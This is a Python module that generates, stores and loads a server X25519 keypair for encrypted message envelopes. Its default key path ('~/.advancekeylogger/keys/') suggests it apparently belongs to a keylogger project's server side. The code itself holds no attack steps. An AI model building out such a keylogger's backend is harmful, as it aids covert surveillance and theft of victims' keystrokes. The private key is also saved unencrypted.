"""Server-side key management for E2E envelopes."""
from __future__ import annotations

import base64
import logging
from typing import Any

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import x25519

from crypto.key_store import KeyStore

logger = logging.getLogger(__name__)


def generate_server_keypair(key_store_path: str) -> str:
    """Generate and persist a server X25519 keypair; return base64 public key."""
    store = KeyStore(key_store_path)
    private_key = x25519.X25519PrivateKey.generate()
    public_key = private_key.public_key()

    store.save_bytes(
        "server_x25519_private",
        private_key.private_bytes(
            serialization.Encoding.Raw,
            serialization.PrivateFormat.Raw,
            serialization.NoEncryption(),
        ),
    )
    store.save_bytes(
        "server_x25519_public",
        public_key.public_bytes(
            serialization.Encoding.Raw,
            serialization.PublicFormat.Raw,
        ),
    )

    public_bytes = public_key.public_bytes(
        serialization.Encoding.Raw, serialization.PublicFormat.Raw
    )
    return base64.b64encode(public_bytes).decode("utf-8")


def load_server_private_key(config: dict[str, Any]) -> x25519.X25519PrivateKey:
    """Load server private key from config or keystore."""
    key_b64 = str(config.get("server_private_key", "")).strip()
    if key_b64:
        raw = base64.b64decode(key_b64.encode("utf-8"))
        return x25519.X25519PrivateKey.from_private_bytes(raw)

    key_store_path = str(config.get("key_store_path", "~/.advancekeylogger/keys/"))
    store = KeyStore(key_store_path)
    raw = store.load_bytes("server_x25519_private")
    if not raw:
        logger.warning(
            "Server private key not found; auto-generating keypair in %s",
            key_store_path,
        )
        public_b64 = generate_server_keypair(key_store_path)
        logger.info("Generated server public key: %s", public_b64)
        raw = store.load_bytes("server_x25519_private")
        if not raw:
            raise ValueError("Failed to generate server keypair")
    return x25519.X25519PrivateKey.from_private_bytes(raw)
